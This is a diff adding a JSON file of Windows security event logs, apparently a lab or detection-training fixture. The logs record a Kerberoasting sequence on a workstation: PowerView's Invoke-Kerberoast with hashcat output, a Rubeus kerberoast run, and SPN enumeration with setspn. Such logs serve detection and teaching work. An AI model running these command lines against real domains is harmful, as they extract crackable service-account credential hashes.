@@ -1,0 +1,60 @@
+{
+  "collected_at": "2026-06-12T18:00:00Z",
+  "host": "WS-CLIENT01",
+  "log_name": "Security",
+  "events": [
+    {
+      "time": "2026-06-12T14:02:28Z",
+      "event_id": 4104,
+      "log_name": "Microsoft-Windows-PowerShell/Operational",
+      "data": {
+        "ScriptBlockText": "Import-Module .\PowerView.ps1; Get-DomainUser -SPN | Invoke-Kerberoast -OutputFormat Hashcat | Out-File roast.txt",
+        "Path": "",
+        "UserId": "CORP\\lowpriv.user"
+      }
+    },
+    {
+      "time": "2026-06-12T14:02:30Z",
+      "event_id": 4688,
+      "data": {
+        "SubjectUserName": "lowpriv.user",
+        "NewProcessName": "C:\\Tools\\Rubeus.exe",
+        "CommandLine": "Rubeus.exe kerberoast /outfile:roast.txt /nowrap",
+        "ParentProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+      }
+    },
+    {
+      "time": "2026-06-12T14:01:00Z",
+      "event_id": 4624,
+      "data": {
+        "TargetUserName": "lowpriv.user",
+        "LogonType": "2",
+        "WorkstationName": "WS-CLIENT01",
+        "IpAddress": "10.0.0.42",
+        "ProcessName": "svchost.exe"
+      }
+    },
+    {
+      "time": "2026-06-12T13:55:00Z",
+      "event_id": 4624,
+      "data": {
+        "TargetUserName": "labadmin",
+        "LogonType": "10",
+        "WorkstationName": "WS-CLIENT01",
+        "IpAddress": "10.0.0.10",
+        "ProcessName": "svchost.exe",
+        "note": "RDP logon — privileged account on endpoint"
+      }
+    },
+    {
+      "time": "2026-06-12T14:02:35Z",
+      "event_id": 4688,
+      "data": {
+        "SubjectUserName": "lowpriv.user",
+        "NewProcessName": "C:\\Windows\\System32\\setspn.exe",
+        "CommandLine": "setspn -T corp.local -Q */*",
+        "ParentProcessName": "C:\\Windows\\System32\\cmd.exe"
+      }
+    }
+  ]
+}
